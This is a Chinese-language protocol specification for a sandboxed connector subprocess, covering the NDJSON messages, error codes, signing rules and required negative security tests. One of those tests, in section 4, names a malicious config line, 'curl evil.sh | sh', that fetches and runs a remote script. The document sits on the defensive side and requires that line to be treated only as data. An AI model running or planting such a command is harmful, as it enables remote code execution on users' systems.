# Connector 子进程协议 v1（详细）

> 状态：Phase 0 合同基线  
> 变更规则：破坏性变更升协议版本；Connector 与 Edge 至少兼容当前与上一版本。

## 1. 进程约定

- Edge 以受限子进程方式启动 Connector：`<connector-binary> --serve`；
- 环境变量仅注入：`SIQ_CONNECTOR_NAME`、`SIQ_CONNECTOR_VERSION`、`SIQ_CONNECTOR_TIMEOUT_MS`；
- 不注入任何凭据；Connector 不得访问网络（例外需在 `describe` 声明并由 Edge 拦截）；
- stdout 只允许 NDJSON 协议消息；诊断信息写 stderr；
- Edge 对单条 `collect` 强制超时（默认 60s）、输出上限（默认 8MB）、并发上限。

## 2. NDJSON 消息

```json
{"id":"req-01","op":"describe","params":{}}
{"id":"req-01","ok":true,"result":{"version":"1.2.0","objects":["hermes_profile"],"required_permissions":["read:/etc/siq/hermes"],"data_categories":["config_names","tool_names"],"max_output_bytes":8388608,"network_access":false}}
{"id":"req-02","op":"collect","params":{"plan":{"scope":{"roots":["/var/lib/siq-hermes/profiles"],"include":["config.yaml","SOUL.md"]},"cursor":null,"limits":{"max_files":200,"max_bytes":16777216}}}}
{"id":"req-02","ok":true,"result":{"candidates":[...],"evidence":[...],"cursor":"hermes-cursor:2026-08-13T12:00:00Z:sha256:abcd"}}
```

## 3. 错误码

| code | 含义 | Edge 行为 |
| --- | --- | --- |
| `scope_invalid` | 范围校验失败 | 任务失败，不回退范围 |
| `limit_exceeded` | 超过文件/字节上限 | 部分结果 + `truncated: true`，记审计 |
| `redaction_failure` | 无法确认脱敏 | 丢弃该批，不上传 |
| `timeout` | 超时 | 取消子进程，任务失败 |
| `unsupported` | 能力不支持 | 标记 `unsupported`，不静默跳过 |

## 4. 负向安全测试（每个 Connector 必须通过）

- 恶意配置：`config.yaml` 内含 `curl evil.sh | sh` 指令 —— 只作为数据传出，不执行；
- 符号链接逃逸：scope 内符号链接指向 scope 外 —— 拒绝或标记；
- 超大文件 / 压缩炸弹 —— 在限额内截断并告警；
- `.env` / 私钥文件 —— 命中即触发 `redaction_failure`；
- 空 scope / 根路径 `/` —— `validate_scope` 必须拒绝。

## 5. 签名与新鲜度

`evidence.signature` 与 `observed_at` 由 Edge 在打包时统一补齐；Connector 输出的 `observed_at` 仅作为事实时间参考，Edge 在 5 分钟内未完成打包则该批作废。

签名规范为 UTF-8 JSON、对象键字典序、无多余空白、HTML 字符不转义。Evidence 签名时
`signature` 字段置为空字符串；上传批次还必须携带 `task_id` 与同一设备密钥产生的
`signature`（批次签名时移除该字段）。控制面同时验证任务绑定、批次签名和每条 Evidence 签名。
